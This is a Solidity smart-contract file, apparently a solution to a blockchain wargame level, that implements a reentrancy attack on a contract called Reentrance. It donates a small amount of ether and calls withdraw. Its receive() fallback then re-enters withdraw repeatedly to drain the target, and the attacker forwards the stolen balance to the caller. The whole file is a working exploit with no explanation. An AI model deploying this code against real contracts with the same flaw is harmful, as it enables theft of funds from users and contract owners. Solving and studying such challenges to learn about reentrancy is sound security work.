// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import './Reentrance.sol';

contract ReentranceAttacker {
  Reentrance target;

  constructor() {}

  function attack(address payable targetAddress) public payable {
    target = Reentrance(targetAddress);
    target.donate{value: 0.001 ether}(address(this));
    target.withdraw(0.001 ether);
    payable(msg.sender).transfer(address(this).balance);
  }

  receive() payable external {
    target.withdraw(0.001 ether);
  }
}
